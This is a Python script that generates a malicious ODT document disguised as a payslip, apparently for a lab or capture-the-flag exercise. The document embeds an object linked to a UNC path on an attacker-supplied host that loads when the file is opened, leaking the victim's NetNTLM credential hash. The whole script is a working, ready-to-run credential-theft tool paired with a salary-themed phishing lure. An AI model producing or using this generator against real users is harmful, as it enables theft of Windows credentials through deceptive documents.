#!/usr/bin/env python3
"""Generate a malicious ODT that leaks NetNTLM to a UNC/HTTP listener (badodf style)."""
import sys, zipfile, os

LHOST = sys.argv[1] if len(sys.argv) > 1 else "10.10.14.245"
OUT = sys.argv[2] if len(sys.argv) > 2 else "payslip.odt"

NS = (
    'xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
    'xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" '
    'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" '
    'xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" '
    'xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" '
    'xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" '
    'xmlns:xlink="http://www.w3.org/1999/xlink" '
    'xmlns:dc="http://purl.org/dc/elements/1.1/" '
    'xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" '
    'xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" '
    'xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" '
    'xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2"'
)

CONTENT = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document-content {NS} office:version="1.2">
 <office:automatic-styles>
  <style:style style:name="fr1" style:family="graphic" style:parent-style-name="Graphics">
   <style:graphic-properties style:vertical-pos="top" style:vertical-rel="paragraph" style:horizontal-pos="center" style:horizontal-rel="paragraph" draw:ole-draw-aspect="1"/>
  </style:style>
 </office:automatic-styles>
 <office:body><office:text>
  <text:p text:style-name="Standard">Payslip details attached. Please review your new salary below.</text:p>
  <text:p text:style-name="Standard">
   <draw:frame draw:style-name="fr1" draw:name="Object1" text:anchor-type="paragraph" svg:width="14.101cm" svg:height="9.999cm" draw:z-index="0">
    <draw:object xlink:href="file://{LHOST}/payslip.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
    <draw:image xlink:href="./ObjectReplacements/Object 1" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
   </draw:frame>
  </text:p>
 </office:text></office:body>
</office:document-content>
'''

MANIFEST = '''<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2">
 <manifest:file-entry manifest:media-type="application/vnd.oasis.opendocument.text" manifest:full-path="/"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="content.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="styles.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="meta.xml"/>
</manifest:manifest>
'''

STYLES = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document-styles {NS} office:version="1.2">
 <office:styles>
  <style:style style:name="Standard" style:family="paragraph" style:class="text"/>
  <style:style style:name="Graphics" style:family="graphic"/>
 </office:styles>
</office:document-styles>
'''

META = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document-meta {NS} office:version="1.2">
 <office:meta><meta:generator>LibreOffice/6.0.3.1</meta:generator></office:meta>
</office:document-meta>
'''

with zipfile.ZipFile(OUT, "w", zipfile.ZIP_DEFLATED) as z:
    zi = zipfile.ZipInfo("mimetype")
    zi.compress_type = zipfile.ZIP_STORED
    z.writestr(zi, "application/vnd.oasis.opendocument.text")
    z.writestr("META-INF/manifest.xml", MANIFEST)
    z.writestr("content.xml", CONTENT)
    z.writestr("styles.xml", STYLES)
    z.writestr("meta.xml", META)

print(f"[+] wrote {OUT} -> file://{LHOST}/payslip.jpg ({os.path.getsize(OUT)} bytes)")
